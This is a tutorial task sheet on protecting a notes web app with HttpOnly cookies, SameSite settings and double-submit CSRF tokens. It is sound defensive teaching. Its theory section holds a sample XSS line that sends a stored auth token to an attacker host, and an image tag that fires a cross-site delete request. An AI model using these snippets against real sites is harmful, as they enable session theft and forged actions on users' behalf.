# Task: HttpOnly Cookies and CSRF Protection

**Related Issue:** #155  
**Category:** Security  
**Prerequisites:** task-011-sessions-vs-jwt  
**Estimated Time:** 2 hours  
**Notes App Context:** Secure the Notes App web frontend with HttpOnly cookies and CSRF protection

---

## Learning Objectives

- Understand why HttpOnly cookies protect against XSS
- Understand the CSRF attack and how to prevent it
- Implement CSRF tokens (Double Submit Cookie pattern)
- Understand SameSite cookie attribute

---

## Theory Section

### XSS and Why HttpOnly Matters

Without HttpOnly:
```javascript
// Attacker's script injected into the page can steal tokens:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

With HttpOnly cookie, JavaScript **cannot** read the cookie at all:
```javascript
document.cookie  // Shows nothing — HttpOnly cookies are hidden from JS
```

### CSRF Attack

With cookies, the browser automatically sends them with every request — including requests triggered by attacker websites:

```html
<!-- On attacker.com -->
<img src="https://notes-app.com/api/notes/delete/123">
<!-- Browser sends the auth cookie automatically! -->
```

### CSRF Prevention with SameSite=Strict

```typescript
res.cookie('auth_token', token, {
  sameSite: 'strict',  // Only sent from same-origin requests
  httpOnly: true,
  secure: true,
});
```

`SameSite=Strict` prevents the cookie from being sent with cross-origin requests, defeating CSRF.

### CSRF Prevention with Double Submit Cookie

For cases where `SameSite=Lax` is needed:

```typescript
// Server sends a CSRF token as a readable (non-HttpOnly) cookie
res.cookie('csrf_token', generateCSRFToken(), {
  sameSite: 'lax',
  secure: true,
  // NOT httpOnly — JS needs to read this
});

// Client reads the CSRF token from cookie and sends it in a header
const csrfToken = getCookieValue('csrf_token');
fetch('/api/notes', {
  headers: { 'X-CSRF-Token': csrfToken },
});

// Server verifies: cookie value === header value
```

An attacker's site can't read the CSRF cookie (same-origin policy) so can't include it in the header.

---

## Task Checklist

- [ ] HttpOnly + Secure + SameSite=Strict cookies implemented
- [ ] Verified JS cannot read auth cookie
- [ ] CSRF protection added (SameSite or Double Submit)
- [ ] Tested CSRF attack scenario manually
- [ ] Security headers set (Content-Security-Policy, X-Frame-Options)

---

**Task Status:** [ ] Not Started | [ ] In Progress | [ ] Completed
